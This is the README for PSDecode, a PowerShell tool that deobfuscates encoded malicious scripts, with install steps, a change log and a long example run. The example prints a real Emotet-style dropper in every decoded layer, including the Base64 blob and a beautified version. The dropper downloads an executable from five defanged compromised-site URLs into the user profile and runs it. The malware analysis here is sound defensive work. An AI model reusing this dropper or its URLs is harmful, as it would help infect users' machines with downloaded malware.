# PSDecode
This is a PowerShell script for deobfuscating other encoded PowerShell scripts. Often, malicious PowerShell scripts have several layers of encodings  (Replace, Base64Decode, etc...) that, once decoded, are executed via a call to Invoke-Expression (IEX, &, .), Invoke-Command, etc... This script employs a technique called method overriding that enables us to essentially intercept calls to functions that I have accounted for within this script and print out the arguments being passed to it (a.k.a what the script was trying to execute).

** Important Note #1: Only run this script within an isolated sandbox. If the encoded powershell attempts to execute a function which I have not accounted for, there is a chance it could execute**

** Important Note #2: The default execution policy for PowerShell is Restricted and if you dont use PowerShell a lot, chances are when you go to run this script, it will give you an error stating "PSDecode cannot be loaded because the execution of scripts is disabled on this system". If you receive this message, you'll need to change you execution policy to Unrestricted either temporarility or permanantly. The simplest way is to open a PowerShell command prompt as Administrator and run: set-executionpolicy unrestricted**

# To Install
## Windows
1. Create a directory named PSDecode within $PSHome\Modules
2. Copy PSDecode.psm1 into $PSHome\Modules\PSDecode\
3. Open a new instance of PowerShell

## Linux
1. Run the following command to identify the different paths specified within the PSModulePath environement variable:
    * **printenv PSModulePath**
    * *Example Output: /home/R3MRUM/.local/share/powershell/Modules:/usr/local/share/powershell/Modules:/snap/powershell/77/opt/powershell/Modules*
    * Everyone's setup is different but you'll most likely want to use the path within your user directory
2. Create a directory named PSDecode within your chosen PSModulePath directory:
    * **mkdir ~/.local/share/powershell/Modules/PSDecode**
3. Move PSDecode.psm1 into this newly created directory
4. Open a new instance of PowerShell

# Help
In a PowerShell console, run **Get-Help PSDecode -Detailed**

# To Run
1. Option #1 [Pass encoded PowerShell via File]:
<pre> > PSDecode .\encoded_ps.ps1</pre>
2. Option #2 [Pass encoded PowerShell via PIPE]:
<pre> > Get-Content .\encoded_ps.ps1 | PSDecode </pre>

# Output Example
> PSDecode -dump -beautify -verbose .\evil.ps1
```PowerShell
VERBOSE: Input received from file: .\evil.ps1
VERBOSE: Calculating MD5 of input
VERBOSE: MD5: 5248e611bedd8bfdd9d2f561179d821a
VERBOSE: Detecting encoding type...
VERBOSE: Encoding detected: ASCII
VERBOSE: Testing input to see if Base64 encoded
VERBOSE: Input was Base64 encoded. Decoding was successful. Saved original Base64 encoded string as layer
VERBOSE: Performing code cleanup on initial script
VERBOSE: 7 Non-escape characters detected... Removing
VERBOSE: Replacing: ."spLit"(	With: .spLit(
VERBOSE: Replacing: ."DowNlOADFILE"(	With: .DowNlOADFILE(
VERBOSE: Replacing: ("{0}{1}"-f 'AB','kDA')	With: ABkDA
VERBOSE: Replacing: ("{1}{0}" -f 'o4','Xc')	With: Xco4
VERBOSE: Replacing: ("{0}{1}" -f '.','exe')	With: .exe
VERBOSE: Replacing: ("{0}{1}" -f'CUQ','4')	With: CUQ4
VERBOSE: Replacing: ("{0}{1}"-f'j','cwC')	With: jcwC
VERBOSE: Replacing: ("{0}{1}{2}"-f 'dj.','com','/c')	With: dj.com/c
VERBOSE: Replacing: ("{0}{2}{1}"-f 'io','om','.c')	With: io.com
VERBOSE: Replacing: ("{1}{0}"-f'om/w','c')	With: com/w
VERBOSE: Replacing: ("{1}{0}" -f 'rn','te')	With: tern
VERBOSE: Replacing: ("{1}{0}" -f't','://ma')	With: ://mat
VERBOSE: Replacing: ("{1}{0}"-f'i','s/5Yx')	With: s/5Yxi
VERBOSE: Replacing: ("{0}{3}{1}{2}"-f 'it','Med','ia','e/')	With: ite/Media
VERBOSE: Replacing: ("{1}{0}" -f'etp','/')	With: /etp
VERBOSE: Replacing: ("{0}{1}"-f 'ads','/')	With: ads/
VERBOSE: Replacing: ("{1}{0}" -f '/G6','in')	With: in/G6
VERBOSE: Replacing: ("{0}{1}" -f 'ds.c','o')	With: ds.co
VERBOSE: Replacing: ("{0}{1}" -f'ome','na')	With: omena
VERBOSE: Replacing: ("{1}{0}"-f 'p','htt')	With: hxxp
VERBOSE: Replacing: ("{1}{0}"-f 'dm','-a')	With: -adm
VERBOSE: Replacing: ("{0}{1}"-f 'om','/S')	With: om/S
VERBOSE: Replacing: ("{0}{1}" -f'4/@','ht')	With: 4/@ht
VERBOSE: Replacing: ("{1}{0}{2}{3}"-f 'rd','/wo','pre','ss')	With: /wordpress
VERBOSE: Replacing: ("{1}{0}"-f'n/KC','i')	With: in/KC
VERBOSE: Replacing: ("{0}{1}"-f'tt','ps')	With: ttps
VERBOSE: Replacing: ("{1}{0}" -f'po','ne')	With: nepo
VERBOSE: Replacing: ("{1}{0}{2}"-f 'www','://','.')	With: ://www.
VERBOSE: Replacing: ("{1}{2}{0}"-f 'aud','w','er')	With: weraud
VERBOSE: Replacing: ("{0}{1}"-f'na','l.c')	With: nal.c
VERBOSE: Replacing: ("{0}{1}" -f'rim','ew')	With: rimew
VERBOSE: Replacing: ("{0}{1}"-f 'l','thyt')	With: lthyt
VERBOSE: Replacing: ("{1}{0}"-f '/he','/')	With: //he
VERBOSE: Replacing: ("{2}{1}{0}" -f 'nt','e','ont')	With: ontent
VERBOSE: Replacing: ("{1}{0}" -f'//','p:')	With: p://
VERBOSE: Replacing: ("{0}{1}"-f'UAA','w')	With: UAAw
VERBOSE: Replacing: ("{1}{0}"-f 'U','AUD')	With: AUDU
VERBOSE: Replacing: ("{2}{0}{1}"-f'41A','Qc','O')	With: O41AQc
VERBOSE: Replacing: ("{1}{0}"-f 'D','oBc')	With: oBcD
VERBOSE: Replacing: ("{0}{2}{1}"-f'TAA','x1','A')	With: TAAAx1
VERBOSE: Replacing: ("{0}{1}" -f 'KA','ABkDA')	With: KAABkDA
VERBOSE: Replacing: ("{0}{1}" -f'B','Xco4')	With: BXco4
VERBOSE: Replacing: ("{1}{0}" -f 'CUQ4','jcwC')	With: jcwCCUQ4
VERBOSE: Replacing: ("{0}{1}{2}"-f 'com/w','p','-c')	With: com/wp-c
VERBOSE: Replacing: ("{0}{1}"-f'tern','a')	With: terna
VERBOSE: Replacing: ("{1}{0}{2}"-f'rix','://mat','in')	With: ://matrixin
VERBOSE: Replacing: ("{3}{2}{1}{0}"-f '/','s/5Yxi','/cs','ite/Media')	With: ite/Media/css/5Yxi/
VERBOSE: Replacing: ("{0}{3}{1}{2}" -f'in/G6','7','/@h','3C')	With: in/G63C7/@h
VERBOSE: Replacing: ("{0}{1}{2}" -f 'w','ar','ds.co')	With: wards.co
VERBOSE: Replacing: ("{1}{0}{2}"-f'/wp','m','-adm')	With: m/wp-adm
VERBOSE: Replacing: ("{1}{0}" -f'tp','4/@ht')	With: 4/@hxxp
VERBOSE: Replacing: ("{7}{1}{2}{5}{8}{3}{6}{0}{4}{9}" -f 'ni','in/KC','/','ttps','nepo','@','://www.','b','h','weraud')	With: bin/KC/@hxxp://www.ninepoweraud
VERBOSE: Replacing: ("{2}{3}{0}{1}"-f 'a','lthyt',':','//he')	With: ://healthyt
VERBOSE: Replacing: ("{2}{1}{0}" -f'p://','tt','@h')	With: @hxxp://
VERBOSE: Replacing: ("{2}{0}{1}" -f'AwD','UAAw','p')	With: pAwDUAAw
VERBOSE: Replacing: ("{0}{1}"-f 'AUDU','D')	With: AUDUD
VERBOSE: Replacing: ("{1}{0}"-f'oBcD','mD')	With: mDoBcD
VERBOSE: Replacing: ("{1}{0}"-f'BXco4','w')	With: wBXco4
VERBOSE: Replacing: ("{19}{35}{12}{28}{18}{17}{20}{14}{32}{30}{34}{10}{37}{29}{4}{36}{7}{15}{31}{13}{9}{6}{38}{33}{2}{1}{0}{26}{3}{25}{23}{24}{22}{8}{5}{16}{27}{21}{11}"-f'gi-','dj.com/c','vi','io.com','com/wp-c','terna','BF/','/','://matrixin','PR','i','ite/Media/css/5Yxi/','/etp','ads/','in/G63C7/@h','up','tio','wards.co','omena','hxxp','m/wp-adm','om/S','4/@hxxp','/','6NA','/wordpress','bin/KC/@hxxp://www.ninepoweraud','nal.c','rimew','.','p','lo','tt','ser','://healthyt','s:/','ontent','ck','@hxxp://')	With: hxxp://etprimewomenawards.com/wp-admin/G63C7/@hxxp://healthytick.com/wp-content/uploads/PRBF/@hxxp://servidj.com/cgi-bin/KC/@hxxp://www.ninepoweraudio.com/wordpress/6NA4/@hxxp://matrixinternational.com/Site/Media/css/5Yxi/
VERBOSE: Replacing: ("{1}{0}"-f'AUDUD','B')	With: BAUDUD
VERBOSE: Replacing: .('Get-Item')	With: Get-Item
VERBOSE: Replacing: .('Invoke-Item')	With: Invoke-Item
VERBOSE: Code cleanup resulted in script modification. Saving original as layer.
VERBOSE: Building decoder
VERBOSE: Base64 encoding decoder
VERBOSE: Executing decoder
VERBOSE: Final layer processed. Successful exit with actions detected
VERBOSE: Processing completed
VERBOSE: Saving layers to C:\Users\REM\AppData\Local\Temp\
VERBOSE: Writing C:\Users\REM\AppData\Local\Temp\5248e611bedd8bfdd9d2f561179d821a_layer_1.txt
VERBOSE: Writing C:\Users\REM\AppData\Local\Temp\5248e611bedd8bfdd9d2f561179d821a_layer_2.txt
VERBOSE: Writing C:\Users\REM\AppData\Local\Temp\5248e611bedd8bfdd9d2f561179d821a_layer_3.txt
VERBOSE: Writing C:\Users\REM\AppData\Local\Temp\5248e611bedd8bfdd9d2f561179d821a_layer_4.txt


############################## Layer 1 ##############################
JABjAGsAXwBBADQAQQA9ACgAIgB7ADAAfQB7ADEAfQAiACAALQBmACAAJwBLAEEAJwAsACgAIgB7ADAAfQB7ADEAfQAiAC0AZgAgACcAQQBCACcALAAnAGsARABBACcAKQApADsAJABRAEEAVQBBAFoARAAgAD0AIAAnADYAMgA1ACcAOwAkAHIARABBAGMAQQBBAD0AKAAiAHsAMQB9AHsAMAB9ACIALQBmACgAIgB7ADAAfQB7ADEAfQAiACAALQBmACcAQgAnACwAKAAiAHsAMQB9AHsAMAB9ACIAIAAtAGYAIAAnAG8ANAAnACwAJwBYAGMAJwApACkALAAnAHcAJwApADsAJABQAEQAawBrAGsAQwBBAD0AJABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQArACcAXAAnACsAJABRAEEAVQBBAFoARAArACgAIgB7ADAAfQB7ADEAfQAiACAALQBmACAAJwAuACcALAAnAGUAeABlACcAKQA7ACQASQBBAEEAQQBVAEQAWgA9ACgAIgB7ADEAfQB7ADAAfQAiACAALQBmACAAKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAJwBDAFUAUQAnACwAJwA0ACcAKQAsACgAIgB7ADAAfQB7ADEAfQAiAC0AZgAnAGoAJwAsACcAYwB3AEMAJwApACkAOwAkAHUAbwB4ADEAQwB3AD0AJgAoACcAbgBlAHcALQBvACcAKwAnAGIAJwArACcAagBlAGMAdAAnACkAIABOAGAARQBUAC4AVwBFAGIAYwBMAGAAaQBlAG4AdAA7ACQAegB3AFEAQQAxAEIAPQAoACIAewAxADkAfQB7ADMANQB9AHsAMQAyAH0AewAyADgAfQB7ADEAOAB9AHsAMQA3AH0AewAyADAAfQB7ADEANAB9AHsAMwAyAH0AewAzADAAfQB7ADMANAB9AHsAMQAwAH0AewAzADcAfQB7ADIAOQB9AHsANAB9AHsAMwA2AH0AewA3AH0AewAxADUAfQB7ADMAMQB9AHsAMQAzAH0AewA5AH0AewA2AH0AewAzADgAfQB7ADMAMwB9AHsAMgB9AHsAMQB9AHsAMAB9AHsAMgA2AH0AewAzAH0AewAyADUAfQB7ADIAMwB9AHsAMgA0AH0AewAyADIAfQB7ADgAfQB7ADUAfQB7ADEANgB9AHsAMgA3AH0AewAyADEAfQB7ADEAMQB9ACIALQBmACcAZwBpAC0AJwAsACgAIgB7ADAAfQB7ADEAfQB7ADIAfQAiAC0AZgAgACcAZABqAC4AJwAsACcAYwBvAG0AJwAsACcALwBjACcAKQAsACcAdgBpACcALAAoACIAewAwAH0AewAyAH0AewAxAH0AIgAtAGYAIAAnAGkAbwAnACwAJwBvAG0AJwAsACcALgBjACcAKQAsACgAIgB7ADAAfQB7ADEAfQB7ADIAfQAiAC0AZgAgACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAnAG8AbQAvAHcAJwAsACcAYwAnACkALAAnAHAAJwAsACcALQBjACcAKQAsACgAIgB7ADAAfQB7ADEAfQAiAC0AZgAoACIAewAxAH0AewAwAH0AIgAgAC0AZgAgACcAcgBuACcALAAnAHQAZQAnACkALAAnAGEAJwApACwAJwBCAEYALwAnACwAJwAvACcALAAoACIAewAxAH0AewAwAH0AewAyAH0AIgAtAGYAJwByAGkAeAAnACwAKAAiAHsAMQB9AHsAMAB9ACIAIAAtAGYAJwB0ACcALAAnADoALwAvAG0AYQAnACkALAAnAGkAbgAnACkALAAnAFAAUgAnACwAJwBpACcALAAoACIAewAzAH0AewAyAH0AewAxAH0AewAwAH0AIgAtAGYAIAAnAC8AJwAsACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAnAGkAJwAsACcAcwAvADUAWQB4ACcAKQAsACcALwBjAHMAJwAsACgAIgB7ADAAfQB7ADMAfQB7ADEAfQB7ADIAfQAiAC0AZgAgACcAaQB0ACcALAAnAE0AZQBkACcALAAnAGkAYQAnACwAJwBlAC8AJwApACkALAAoACIAewAxAH0AewAwAH0AIgAgAC0AZgAnAGUAdABwACcALAAnAC8AJwApACwAKAAiAHsAMAB9AHsAMQB9ACIALQBmACAAJwBhAGQAcwAnACwAJwAvACcAKQAsACgAIgB7ADAAfQB7ADMAfQB7ADEAfQB7ADIAfQAiACAALQBmACgAIgB7ADEAfQB7ADAAfQAiACAALQBmACAAJwAvAEcANgAnACwAJwBpAG4AJwApACwAJwA3ACcALAAnAC8AQABoACcALAAnADMAQwAnACkALAAnAHUAcAAnACwAJwB0AGkAbwAnACwAKAAiAHsAMAB9AHsAMQB9AHsAMgB9ACIAIAAtAGYAIAAnAHcAJwAsACcAYQByACcALAAoACIAewAwAH0AewAxAH0AIgAgAC0AZgAgACcAZABzAC4AYwAnACwAJwBvACcAKQApACwAKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAJwBvAG0AZQAnACwAJwBuAGEAJwApACwAKAAiAHsAMQB9AHsAMAB9ACIALQBmACAAJwBwACcALAAnAGgAdAB0ACcAKQAsACgAIgB7ADEAfQB7ADAAfQB7ADIAfQAiAC0AZgAnAC8AdwBwACcALAAnAG0AJwAsACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAgACcAZABtACcALAAnAC0AYQAnACkAKQAsACgAIgB7ADAAfQB7ADEAfQAiAC0AZgAgACcAbwBtACcALAAnAC8AUwAnACkALAAoACIAewAxAH0AewAwAH0AIgAgAC0AZgAnAHQAcAAnACwAKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAJwA0AC8AQAAnACwAJwBoAHQAJwApACkALAAnAC8AJwAsACcANgBOAEEAJwAsACgAIgB7ADEAfQB7ADAAfQB7ADIAfQB7ADMAfQAiAC0AZgAgACcAcgBkACcALAAnAC8AdwBvACcALAAnAHAAcgBlACcALAAnAHMAcwAnACkALAAoACIAewA3AH0AewAxAH0AewAyAH0AewA1AH0AewA4AH0AewAzAH0AewA2AH0AewAwAH0AewA0AH0AewA5AH0AIgAgAC0AZgAgACcAbgBpACcALAAoACIAewAxAH0AewAwAH0AIgAtAGYAJwBuAC8ASwBDACcALAAnAGkAJwApACwAJwAvACcALAAoACIAewAwAH0AewAxAH0AIgAtAGYAJwB0AHQAJwAsACcAcABzACcAKQAsACgAIgB7ADEAfQB7ADAAfQAiACAALQBmACcAcABvACcALAAnAG4AZQAnACkALAAnAEAAJwAsACgAIgB7ADEAfQB7ADAAfQB7ADIAfQAiAC0AZgAgACcAdwB3AHcAJwAsACcAOgAvAC8AJwAsACcALgAnACkALAAnAGIAJwAsACcAaAAnACwAKAAiAHsAMQB9AHsAMgB9AHsAMAB9ACIALQBmACAAJwBhAHUAZAAnACwAJwB3ACcALAAnAGUAcgAnACkAKQAsACgAIgB7ADAAfQB7ADEAfQAiAC0AZgAnAG4AYQAnACwAJwBsAC4AYwAnACkALAAoACIAewAwAH0AewAxAH0AIgAgAC0AZgAnAHIAaQBtACcALAAnAGUAdwAnACkALAAnAC4AJwAsACcAcAAnACwAJwBsAG8AJwAsACcAdAB0ACcALAAnAHMAZQByACcALAAoACIAewAyAH0AewAzAH0AewAwAH0AewAxAH0AIgAtAGYAIAAnAGEAJwAsACgAIgB7ADAAfQB7ADEAfQAiAC0AZgAgACcAbAAnACwAJwB0AGgAeQB0ACcAKQAsACcAOgAnACwAKAAiAHsAMQB9AHsAMAB9ACIALQBmACAAJwAvAGgAZQAnACwAJwAvACcAKQApACwAJwBzADoALwAnACwAKAAiAHsAMgB9AHsAMQB9AHsAMAB9ACIAIAAtAGYAIAAnAG4AdAAnACwAJwBlACcALAAnAG8AbgB0ACcAKQAsACcAYwBrACcALAAoACIAewAyAH0AewAxAH0AewAwAH0AIgAgAC0AZgAoACIAewAxAH0AewAwAH0AIgAgAC0AZgAnAC8ALwAnACwAJwBwADoAJwApACwAJwB0AHQAJwAsACcAQABoACcAKQApAC4AIgBzAHAATABgAGkAdAAiACgAJwBAACcAKQA7ACQAYgBjAEIAQQBRAF8APQAoACIAewAyAH0AewAwAH0AewAxAH0AIgAgAC0AZgAnAEEAdwBEACcALAAoACIAewAwAH0AewAxAH0AIgAtAGYAJwBVAEEAQQAnACwAJwB3ACcAKQAsACcAcAAnACkAOwBmAG8AcgBlAGEAYwBoACgAJABUAEcAQgBRAFUAQgAgAGkAbgAgACQAegB3AFEAQQAxAEIAKQB7AHQAcgB5AHsAJAB1AG8AeAAxAEMAdwAuACIARABvAGAAdwBOAGwATwBgAEEARABGAEkATABFACIAKAAkAFQARwBCAFEAVQBCACwAIAAkAFAARABrAGsAawBDAEEAKQA7ACQAYQBBAFoANABBAEEARABBAD0AKAAiAHsAMQB9AHsAMAB9ACIALQBmACgAIgB7ADAAfQB7ADEAfQAiAC0AZgAgACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAgACcAVQAnACwAJwBBAFUARAAnACkALAAnAEQAJwApACwAJwBCACcAKQA7AEkAZgAgACgAKAAuACgAJwBHACcAKwAnAGUAdAAnACsAJwAtAEkAdABlAG0AJwApACAAJABQAEQAawBrAGsAQwBBACkALgAiAEwARQBgAE4ARwBgAFQASAAiACAALQBnAGUAIAAyADgAMwA5ADcAKQAgAHsALgAoACcASQBuAHYAbwBrACcAKwAnAGUALQBJAHQAZQAnACsAJwBtACcAKQAgACQAUABEAGsAawBrAEMAQQA7ACQAVABBAEIARAA0AFUAQQA9ACgAIgB7ADIAfQB7ADAAfQB7ADEAfQAiAC0AZgAnADQAMQBBACcALAAnAFEAYwAnACwAJwBPACcAKQA7AGIAcgBlAGEAawA7ACQAbQBDAEQAWgBVAEEAPQAoACIAewAxAH0AewAwAH0AIgAtAGYAKAAiAHsAMQB9AHsAMAB9ACIALQBmACAAJwBEACcALAAnAG8AQgBjACcAKQAsACcAbQBEACcAKQB9AH0AYwBhAHQAYwBoAHsAfQB9ACQAagBaAEIAQwBDAEEAPQAoACIAewAwAH0AewAyAH0AewAxAH0AIgAtAGYAJwBUAEEAQQAnACwAJwB4ADEAJwAsACcAQQAnACkA


############################## Layer 2 ##############################
$ck_A4A=("{0}{1}" -f 'KA',("{0}{1}"-f 'AB','kDA'));$QAUAZD = '625';$rDAcAA=("{1}{0}"-f("{0}{1}" -f'B',("{1}{0}" -f 'o4','Xc')),'w');$PDkkkCA=$env:userprofile+'\'+$QAUAZD+("{0}{1}" -f '.','exe');$IAAAUDZ=("{1}{0}" -f ("{0}{1}" -f'CUQ','4'),("{0}{1}"-f'j','cwC'));$uox1Cw=&('new-o'+'b'+'ject') N`ET.WEbcL`ient;$zwQA1B=("{19}{35}{12}{28}{18}{17}{20}{14}{32}{30}{34}{10}{37}{29}{4}{36}{7}{15}{31}{13}{9}{6}{38}{33}{2}{1}{0}{26}{3}{25}{23}{24}{22}{8}{5}{16}{27}{21}{11}"-f'gi-',("{0}{1}{2}"-f 'dj.','com','/c'),'vi',("{0}{2}{1}"-f 'io','om','.c'),("{0}{1}{2}"-f ("{1}{0}"-f'om/w','c'),'p','-c'),("{0}{1}"-f("{1}{0}" -f 'rn','te'),'a'),'BF/','/',("{1}{0}{2}"-f'rix',("{1}{0}" -f't','://ma'),'in'),'PR','i',("{3}{2}{1}{0}"-f '/',("{1}{0}"-f'i','s/5Yx'),'/cs',("{0}{3}{1}{2}"-f 'it','Med','ia','e/')),("{1}{0}" -f'etp','/'),("{0}{1}"-f 'ads','/'),("{0}{3}{1}{2}" -f("{1}{0}" -f '/G6','in'),'7','/@h','3C'),'up','tio',("{0}{1}{2}" -f 'w','ar',("{0}{1}" -f 'ds.c','o')),("{0}{1}" -f'ome','na'),("{1}{0}"-f 'p','htt'),("{1}{0}{2}"-f'/wp','m',("{1}{0}"-f 'dm','-a')),("{0}{1}"-f 'om','/S'),("{1}{0}" -f'tp',("{0}{1}" -f'4/@','ht')),'/','6NA',("{1}{0}{2}{3}"-f 'rd','/wo','pre','ss'),("{7}{1}{2}{5}{8}{3}{6}{0}{4}{9}" -f 'ni',("{1}{0}"-f'n/KC','i'),'/',("{0}{1}"-f'tt','ps'),("{1}{0}" -f'po','ne'),'@',("{1}{0}{2}"-f 'www','://','.'),'b','h',("{1}{2}{0}"-f 'aud','w','er')),("{0}{1}"-f'na','l.c'),("{0}{1}" -f'rim','ew'),'.','p','lo','tt','ser',("{2}{3}{0}{1}"-f 'a',("{0}{1}"-f 'l','thyt'),':',("{1}{0}"-f '/he','/')),'s:/',("{2}{1}{0}" -f 'nt','e','ont'),'ck',("{2}{1}{0}" -f("{1}{0}" -f'//','p:'),'tt','@h'))."spL`it"('@');$bcBAQ_=("{2}{0}{1}" -f'AwD',("{0}{1}"-f'UAA','w'),'p');foreach($TGBQUB in $zwQA1B){try{$uox1Cw."Do`wNlO`ADFILE"($TGBQUB, $PDkkkCA);$aAZ4AADA=("{1}{0}"-f("{0}{1}"-f ("{1}{0}"-f 'U','AUD'),'D'),'B');If ((.('G'+'et'+'-Item') $PDkkkCA)."LE`NG`TH" -ge 28397) {.('Invok'+'e-Ite'+'m') $PDkkkCA;$TABD4UA=("{2}{0}{1}"-f'41A','Qc','O');break;$mCDZUA=("{1}{0}"-f("{1}{0}"-f 'D','oBc'),'mD')}}catch{}}$jZBCCA=("{0}{2}{1}"-f'TAA','x1','A')


############################## Layer 3 ##############################
$ck_A4A='KAABkDA';$QAUAZD = '625';$rDAcAA='wBXco4';$PDkkkCA=$env:userprofile+'\'+$QAUAZD+'.exe';$IAAAUDZ='jcwCCUQ4';$uox1Cw=&('new-object') NET.WEbcLient;$zwQA1B='hxxp://etprimewomenawards.com/wp-admin/G63C7/@hxxp://healthytick.com/wp-content/uploads/PRBF/@hxxp://servidj.com/cgi-bin/KC/@hxxp://www.ninepoweraudio.com/wordpress/6NA4/@hxxp://matrixinternational.com/Site/Media/css/5Yxi/'.spLit('@');$bcBAQ_='pAwDUAAw';foreach($TGBQUB in $zwQA1B){try{$uox1Cw.DowNlOADFILE($TGBQUB, $PDkkkCA);$aAZ4AADA='BAUDUD';If ((Get-Item $PDkkkCA)."LENGTH" -ge 28397) {Invoke-Item $PDkkkCA;$TABD4UA='O41AQc';break;$mCDZUA='mDoBcD'}}catch{}}$jZBCCA='TAAAx1'


######################### Beautified Layer ##########################
$ck_A4A='KAABkDA';
$QAUAZD = '625';
$rDAcAA='wBXco4';
$PDkkkCA=$env:userprofile+'\'+$QAUAZD+'.exe';
$IAAAUDZ='jcwCCUQ4';
$uox1Cw=&('new-object') NET.WEbcLient;
$zwQA1B='hxxps://etprimewomenawards.com/wp-admin/G63C7/@hxxp://healthytick.com/wp-content/uploads/PRBF/@hxxp://servidj.com/cgi-bin/KC/@hxxps://www.ninepoweraudio.com/wordpress/6NA4/@hxxp://matrixinternational.com/Site/Media/css/5Yxi/'.spLit('@');
$bcBAQ_='pAwDUAAw';
foreach($TGBQUB in $zwQA1B){
	try{
		$uox1Cw.DowNlOADFILE($TGBQUB, $PDkkkCA);
		$aAZ4AADA='BAUDUD';
		If ((Get-Item $PDkkkCA)."LENGTH" -ge 28397) {
			Invoke-Item $PDkkkCA;
			$TABD4UA='O41AQc';
			break;
			$mCDZUA='mDoBcD'}
		}
	catch{
		}
	}
$jZBCCA='TAAAx1'


############################## Actions ##############################
    1. [System.Net.WebClient.DownloadFile] Download From: hxxp://etprimewomenawards.com/wp-admin/G63C7/ --> Save To: C:\Users\REM\625.exe
    2. [Get-Item.length] Returning length of 100000 for: C:\Users\REM\625.exe
    3. [Invoke-Item] Execute/Open: C:\Users\REM\625.exe
```
# Change Log
* 2019.12.30 [v5.1]
  * Bug Fix: Changed encoded command length check to write to temp file if length of encoded command is less than 8k bytes. The previous value (12190) referred to the max length of script blocks permitted by PowerShell. However, for Windows XP+, the max command-line length is 8191 bytes, which is the value that should be respected. [Issue #12](https://github.com/R3MRUM/PSDecode/issues/12)
* 2019.12.12 [v5.0]
  * PowerShell Core Support. Can now run PSDecode on Linux. Tested with PowerShell Core v6.2.3 on Ubuntu 19.04. Should also work on MacOS but this has not been tested. [Issue #8](https://github.com/R3MRUM/PSDecode/issues/8)
  * Improved regex for string replace resolution function
* 2019.09.01 [v4.4]
  * Added -x switch to make New-Object override optional, which may result in successful script decoding in times when standard decode fails but at the risk of malicious code execution.
  * Moved help syntax into PSDecode function block so that 'Get-Help PSDecode' properly displays cmdlet help information
* 2019.08.24 [v4.3]
  * Verbose logging message referenced actions for another function. Updated message to reflect actual action being performed. Reported as [Issue #10](https://github.com/R3MRUM/PSDecode/issues/10)
* 2019.07.14 [v4.2]
  * Fix for [Issue #9](https://github.com/R3MRUM/PSDecode/issues/9) -dump switch where only a single encoded executable is present resulted in each byte in the executable being written to individual files.
* 2019.07.07 [v4.1]
  * Added -timeout arg to limit length of time the decoder should run.
  * Added more granular decoder exit code and stderr logic. 
  * Added Base64 encoded executable detection and extraction functionality. If a base64 encoded executable is found embedded within a PowerShell script, it will notify you. The executable can be decoded and saved to disk by passing the -dump switch.
  * Added additional code cleanup logic.
* 2019.07.02
  * Made beautification of final layer optional via -beautify switch because complex scripts can break the beautify logic resulting in even uglier output.
  * Added -verbose switch that prints more details to the console regarding what PSDecode is doing during processing. Should help with troubleshooting.
  * Added -dump switch. When specified, PSDecode will dump all decoded layers out to individual files so that users dont have to copy/paste from console.
  * New-Object override now returns a valid object that was requested if a specific override doesnt exist. Should help to achieve successful detonation rate.
  * Decoder script is now launched using System.Diagnostics.ProcessStartInfo which allows for greater control of processing and error handling. Decoder script errors are now captured and appended to the end of the output as formatted text.
  * Decoder script is now base64 encoded prior to being executed. This preserves the original script text and will reduce failure rates due to strings within double-quotes being pre-maturely evaluated.
  * Existing code-cleanup logic improved and additional code-cleanup logic implemented.
  * Fixed text encoding detection logic.
* 2019.05.20
  * Added Get-Item override.
  * Implemented string formatting resolver.
  * Automatic input encoding detection. -u switch is no longer required.
  * Can now handle Base64 encoded input.
  * Final layer is now Beautified.
  * DownloadFile action now only takes up a single line in the Actions output.
* 2018.06.05
  * Included -u switch that users will need to specify if the powershell script they are attempting to decode is Unicode encoded.
  * Updated script to properly handle the presence of whitespace characters wrapped in quotes.
* 2018.05.30
  * Added better handling of double quotes during script building to eliminate hard failure.
  * Implemented replace function to replace the string concatenation '+' that could be found within a malicious script with an empty string. Eliminates simple obfuscation in layer output.
* 2018.03.20 - updated script to account for changes made to newest version of Emotet's encoding scheme
